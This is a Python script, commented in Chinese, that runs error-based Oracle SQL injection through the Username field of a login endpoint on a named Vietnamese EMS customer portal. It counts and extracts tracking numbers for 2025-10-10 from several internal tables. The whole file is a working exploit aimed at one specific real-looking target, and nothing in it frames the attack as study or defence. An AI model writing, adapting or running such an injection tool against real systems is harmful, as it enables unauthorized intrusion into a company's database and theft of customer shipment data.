#!/usr/bin/env python3
"""
严格分析2025-10-10的EMS运单号
检查所有可能的表和字段
"""

import requests
import json
import time

class StrictAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def strict_count_today(self):
        """严格统计10月10日的EMS运单号"""
        print("=" * 80)
        print("📊 严格统计：仅2025-10-10的EMS运单号")
        print("=" * 80)
        
        date = '20251010'
        
        # 1. SHIPMENT表
        print(f"\n{'='*80}")
        print("1. SHIPMENT表（CREATE_DATE=20251010）")
        print(f"{'='*80}")
        
        queries_shipment = [
            ("总运单数", f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            ("CODE包含E且VN", f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND CODE LIKE 'E%' AND CODE LIKE '%VN'"),
            ("CODE以E开头", f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND CODE LIKE 'E%'"),
            ("独立CODE", f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
        ]
        
        for name, query in queries_shipment:
            result = self.extract_via_error(query)
            if result:
                print(f"  {name}: {result}")
            time.sleep(1)
        
        # 2. E1E2_PH表
        print(f"\n{'='*80}")
        print("2. E1E2_PH表（NGAY=20251010）")
        print(f"{'='*80}")
        
        queries_e1e2 = [
            ("总记录数", f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            ("独立MABC", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            ("MABC以E开头", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND MABC LIKE 'E%'"),
            ("MABC包含VN", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND MABC LIKE '%VN'"),
            ("MABC格式E*VN", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND MABC LIKE 'E%VN'"),
        ]
        
        for name, query in queries_e1e2:
            result = self.extract_via_error(query)
            if result:
                print(f"  {name}: {result}")
            time.sleep(1)
        
        # 3. JOURNEYTOKEN表
        print(f"\n{'='*80}")
        print("3. JOURNEYTOKEN_ZNS表（TOKENDATE=20251010）")
        print(f"{'='*80}")
        
        queries_journey = [
            ("总记录数", f"SELECT COUNT(*) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}'"),
            ("独立ITEMCODE", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}'"),
            ("ITEMCODE以E开头", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%'"),
            ("ITEMCODE格式E*VN", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'"),
        ]
        
        for name, query in queries_journey:
            result = self.extract_via_error(query)
            if result:
                print(f"  {name}: {result}")
            time.sleep(1)
        
        # 4. E1E2_PH_TEMP_DATA2_LOG表
        print(f"\n{'='*80}")
        print("4. E1E2_PH_TEMP_DATA2_LOG表（NGAY=20251010）")
        print(f"{'='*80}")
        
        queries_temp = [
            ("总记录数", f"SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"),
            ("独立MABC", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"),
            ("MABC格式E*VN", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}' AND MABC LIKE 'E%VN'"),
        ]
        
        for name, query in queries_temp:
            result = self.extract_via_error(query)
            if result:
                print(f"  {name}: {result}")
            time.sleep(1)
        
        # 5. API_CALL_LOG表
        print(f"\n{'='*80}")
        print("5. API_CALL_LOG表（CALL_TIME=20251010或CREATED_AT）")
        print(f"{'='*80}")
        
        queries_api = [
            ("CALL_TIME=20251010", f"SELECT COUNT(*) FROM EMS.API_CALL_LOG WHERE CALL_TIME='{date}'"),
            ("独立ITEMCODE", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.API_CALL_LOG WHERE CALL_TIME='{date}'"),
            ("ITEMCODE格式E*VN", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.API_CALL_LOG WHERE CALL_TIME='{date}' AND ITEMCODE LIKE 'E%VN'"),
        ]
        
        for name, query in queries_api:
            result = self.extract_via_error(query)
            if result:
                print(f"  {name}: {result}")
            time.sleep(1)
    
    def extract_samples_strict(self):
        """严格提取10月10日的运单号样本"""
        print(f"\n\n{'='*80}")
        print("📦 提取样本运单号（仅10月10日）")
        print(f"{'='*80}")
        
        date = '20251010'
        
        # 从每个表提取样本
        tables = [
            ('SHIPMENT', 'CODE', 'CREATE_DATE', date),
            ('E1E2_PH', 'MABC', 'NGAY', date),
            ('JOURNEYTOKEN_ZNS', 'ITEMCODE', 'TOKENDATE', date),
            ('E1E2_PH_TEMP_DATA2_LOG', 'MABC', 'NGAY', date),
            ('API_CALL_LOG', 'ITEMCODE', 'CALL_TIME', date),
        ]
        
        for table, code_field, date_field, date_value in tables:
            print(f"\n{'='*80}")
            print(f"从 {table} 表提取（{date_field}={date_value}）:")
            print(f"{'='*80}")
            
            count = 0
            for i in range(1, 31):
                query = f"SELECT DISTINCT {code_field} FROM (SELECT DISTINCT {code_field} FROM EMS.{table} WHERE {date_field}='{date_value}' AND {code_field} LIKE 'E%' ORDER BY {code_field}) WHERE ROWNUM={i}"
                result = self.extract_via_error(query)
                
                if result and result != 'NULL':
                    count += 1
                    if count <= 20:
                        print(f"  {count}. {result}")
                
                time.sleep(0.2)
            
            print(f"\n  ✅ 共找到 {count} 个样本")
    
    def final_summary(self):
        """最终总结"""
        print(f"\n\n{'='*80}")
        print("📊 最终总结：2025-10-10的EMS运单号")
        print(f"{'='*80}")
        
        date = '20251010'
        
        # 汇总统计
        queries = [
            ("SHIPMENT独立运单", "EMS.SHIPMENT", "CODE", "CREATE_DATE"),
            ("E1E2_PH独立MABC", "EMS.E1E2_PH", "MABC", "NGAY"),
            ("JOURNEYTOKEN独立运单", "EMS.JOURNEYTOKEN_ZNS", "ITEMCODE", "TOKENDATE"),
            ("TEMP_LOG独立MABC", "EMS.E1E2_PH_TEMP_DATA2_LOG", "MABC", "NGAY"),
            ("API_LOG独立运单", "EMS.API_CALL_LOG", "ITEMCODE", "CALL_TIME"),
        ]
        
        total = 0
        
        for name, table, field, date_field in queries:
            query = f"SELECT COUNT(DISTINCT {field}) FROM {table} WHERE {date_field}='{date}'"
            result = self.extract_via_error(query)
            
            if result and result != '0':
                print(f"\n✅ {name}: {result} 个")
                try:
                    total += int(result)
                except:
                    pass
            
            time.sleep(1)
        
        print(f"\n{'='*80}")
        print(f"总计（可能有重复）: {total} 个")
        print(f"{'='*80}")
    
    def run(self):
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接")
            return
        print(f"✅ 连接成功\n")
        
        self.strict_count_today()
        self.extract_samples_strict()
        self.final_summary()
        
        print("\n" + "=" * 80)
        print("✅ 严格分析完成")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    analyzer = StrictAnalyzer(target_url)
    analyzer.run()
